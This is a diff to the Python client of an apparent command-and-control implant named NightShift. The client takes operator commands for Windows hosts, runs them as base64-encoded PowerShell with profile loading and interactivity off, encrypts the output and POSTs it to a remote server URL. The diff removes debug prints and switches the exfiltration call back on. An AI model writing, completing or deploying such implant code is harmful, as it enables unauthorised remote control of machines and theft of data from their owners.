@@ -65,14 +65,10 @@ class NightShift_Client():
                         ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
                         ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                     elif (ns_host_fof == 'ALL' and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
-                        print('Do all the NT things')
                         ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
-                        print(ns_get_output)
                         ns_json_cmd_output = { 'time': str(ns_get_output[0]),'ns_host_hash': ns_host_hash, 'ns_host_type': ns_host_os, 'ns_cmd_ran': ns_host_os_cmd_fof, 'ns_cmd_output': ns_get_output[1] }
-                        print(ns_json_cmd_output)
                         ns_post_data = ns_get_cipher.encrypt(str(ns_json_cmd_output))
-                        print(ns_post_data)
-                        #ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
+                        ns_data_post_resp = loop.run_until_complete(self.PostData(ns_post_data,ns_post_ua,ns_post_url))
                     elif (ns_host_fof == ns_host_hash and ns_host_os_fof == 'nt' and ns_host_os_fof == ns_host_os):
                         print('Specific NT Host')
                         ns_get_output = self.os_winnt(ns_host_os_cmd_fof)
@@ -135,8 +131,9 @@ class NightShift_Client():
 
     def os_winnt(self, ns_host_os_cmd_fof):
         time_stamp = datetime.now()
-        ns_ps_cmd = 'powershell -nop -win hidden -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
-        output = (Popen(ns_ps_cmd, stdout=PIPE, shell=True).stdout.read())
+        #ns_ps_cmd = 'powershell -nop -win hidden -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
+        ns_ps_cmd = 'powershell -nop -noni -enc "' + base64.b64encode(ns_host_os_cmd_fof.encode('utf_16_le')).decode('utf-8') + '"'
+        output = (Popen(ns_ps_cmd, stdout=PIPE, shell=True).stdout.read()).decode('ascii')
         output_b64 = base64.b64encode(bytes(output, 'utf-8')).decode('ascii')
         return time_stamp, output_b64
 
